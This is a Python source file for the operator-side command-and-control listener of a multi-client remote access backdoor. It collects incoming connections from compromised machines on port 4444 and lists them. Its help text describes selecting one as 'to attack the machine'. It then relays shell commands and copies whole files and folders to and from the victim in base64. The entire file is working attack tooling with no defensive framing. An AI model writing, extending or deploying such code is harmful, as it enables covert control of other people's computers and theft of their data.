import os
import socket
import sys
import json
import base64
import threading

class Listener:

    def __init__(self,ip,port): 
        
        self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.listener.bind((ip,port))
        self.listener.listen(0)
        self.clients = []
        print("\n[+] Waiting for incoming connection.")
        
    def client_handle(self):
        while 1:
            conn, addr = self.listener.accept()
            [name,loc] = self.receive_data(conn)
            
            self.clients.append((conn,addr,name,loc))


    def send_data(self,data):
        json_data = json.dumps(data)
        self.client.send(json_data.encode())

    def receive_data(self,client):
        json_data = ""
        while True:
            try:
                json_data = json_data + client.recv(2048).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                if json_data =="":
                    break
                continue

    def sharing_data(self,data):

        self.send_data(data)
        if data[0] == "exit":
            self.client.close()
            self.clients.remove((self.client, self.addre,self.name,self.loc ))
            sys.exit()
        return self.receive_data(self.client)

    def write_file(self,filename,content):
        with open(filename,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Successfully download "

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def upload(self,path):
        folder_content = {}
        if os.path.isfile(path):
            return self.read_file(path).decode()
        
        for root,dirs,files in os.walk(path):
            for file in files:
                file_path = os.path.join(root,file).replace("\\","/")
                file_content = self.read_file(file_path)
                folder_content[file_path] = file_content.decode()
        return folder_content
    
    def download(self,name,data):
        if not isinstance(data,dict):
            return self.write_file(name,data.encode()) + "1 file"
        num = 0
        
        for file_path,content in data.items():
            folder = file_path.removesuffix(os.path.basename(file_path))
            if not os.path.exists(folder):
                os.makedirs(folder,exist_ok=True)
            result = self.write_file(file_path,content.encode())
            num += 1
        return f"{result} {num} files"
    
    def run(self,loc):
        cur_dir = loc
        try:
            while True:
                data = input(cur_dir, )
                data = data.split(" ")
                if data[0] == "upload":
                    path = " ".join(data[1:])
                    content = self.upload(path)
                    data.append(content)
                response = self.sharing_data(data)

                if data[0] == "cd" and len(data) >= 2:
                    if response != cur_dir:
                        cur_dir = response
                        response = "Directory changed to "+ data[-1]
                    else:
                        response = "[-] Directory not found!"
                elif data[0] == "back":
                    break
                elif data[0] == "download":
                    file = " ".join(data[1:])
                    file_name = file.split("\\")[-1]
                    response = self.download(file_name,response)
                    
                print(response)
        except ConnectionResetError:
            self.client.close()
            self.clients.remove((self.client, self.addre, self.name, self.loc))
            print("[-] Disconnected")


    def manual_accept(self,index):
        
        if 0 <= index < len(self.clients):
            self.client, self.addre,self.name,self.loc = self.clients[index]
            print("connected to " + self.name)
            self.run(self.loc)
            
        
    def sys_info(self):
        print("\t\t"+"-"*80)
        head = ["INDEX","SYSTEM NAME","IPADDRESS:PORT"]
        print(f"\t\t|{head[0].center(10)}|{head[1].center(35)}|{head[2].center(30)} |")
        print("\t\t"+"-"*80)

        for i,client in enumerate(self.clients):
            index = str(i).center(10)
            name = client[2].center(35)
            ip = ":".join( [ client[1][0], str(client[1][1]) ] ).center(30)

            print(f"\t\t|{index}|{name}|{ip} |")
        print("\t\t"+"-"*80)

    def main(self):
        handle = threading.Thread(target=self.client_handle)
        handle.daemon =True
        handle.start()

        while 1:
            option = input("\n>> ")
            option = option.split(" ")
            if option[0] == "sys.info":
                self.sys_info()

            elif option[0] == "sys.get":
                self.manual_accept(int(option[1]))

            elif option ==['show','options'] or option == ['options'] :
                print("\nsys.info           - for show a list machines are connected")
                print("sys.get <index>    - to attack the machine")

            else:
                print("[-] option not found\n'show options' for more details")
        

while 1:
    try:
        listening = Listener("127.0.0.1",4444)
        listening.main()
        break
    except Exception:
        print("An existing connection is disconnected")
        listening.listener.close()
        continue
    except KeyboardInterrupt:
        listening.listener.close()
        print("\n[+] Quitting...")
        sys.exit()